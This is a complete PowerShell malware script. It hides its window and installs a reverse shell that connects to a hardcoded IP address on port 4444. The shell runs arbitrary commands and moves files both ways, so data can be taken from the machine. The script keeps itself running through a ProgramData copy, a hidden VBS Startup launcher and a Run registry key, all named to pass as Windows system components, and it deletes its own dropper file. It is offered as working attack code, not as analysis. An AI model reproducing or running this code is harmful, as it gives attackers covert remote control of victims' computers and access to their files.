# Hide PowerShell window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Paths for persistence
$programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$persistentPath = "C:\ProgramData\SystemShell.ps1"
$vbsPath = Join-Path $startupPath "SystemRun.vbs"

# Save current script to ProgramData for persistence
$currentScriptContent = @'
# Hidden PowerShell reverse shell
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# TCP Connection parameters
$ip = "143.110.191.171"
$port = 4444

function Start-ReverseShell {
    while($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            while($client.Connected) {
                $writer.Write("PS " + (Get-Location).Path + "> ")
                $command = $reader.ReadLine()
                
                if($command -eq "exit") { break }
                if($command -eq "quit") { return }
                
                # Handle special commands
                if($command.StartsWith("download ")) {
                    $file = $command.Substring(9)
                    if(Test-Path $file) {
                        try {
                            $content = [System.IO.File]::ReadAllBytes($file)
                            $writer.Write("[DOWNLOAD]:" + [Convert]::ToBase64String($content) + "`n")
                        } catch {
                            $writer.Write("Error downloading file: " + $_.Exception.Message + "`n")
                        }
                    } else {
                        $writer.Write("File not found`n")
                    }
                    continue
                }
                
                if($command.StartsWith("upload ")) {
                    $parts = $command.Split(' ', 3)
                    if($parts.Length -eq 3) {
                        try {
                            $filePath = $parts[1]
                            $fileContent = [Convert]::FromBase64String($parts[2])
                            [System.IO.File]::WriteAllBytes($filePath, $fileContent)
                            $writer.Write("File uploaded successfully`n")
                        } catch {
                            $writer.Write("Error uploading file: " + $_.Exception.Message + "`n")
                        }
                    }
                    continue
                }
                
                # Execute regular command
                try {
                    $output = Invoke-Expression -Command $command 2>&1 | Out-String
                    $writer.Write($output)
                } catch {
                    $writer.Write("Error: " + $_.Exception.Message + "`n")
                }
            }
            
            $reader.Close()
            $writer.Close()
            $stream.Close()
            $client.Close()
        } catch {
            Start-Sleep -Seconds 10
        }
    }
}

Start-ReverseShell
'@

# Write persistent script
Set-Content -Path $persistentPath -Value $currentScriptContent -Force

# Create VBS script for hidden startup execution
$vbsContent = @"
Set ws = CreateObject("Wscript.Shell")
ws.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$persistentPath""", 0, False
"@

Set-Content -Path $vbsPath -Value $vbsContent -Force

# Registry persistence
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsSystem"
$regValue = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null

# Start the reverse shell immediately
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`"" -WindowStyle Hidden

# Remove temporary download file
Start-Sleep -Seconds 5
Remove-Item -Path "$env:TEMP\persist.ps1" -Force -ErrorAction SilentlyContinue
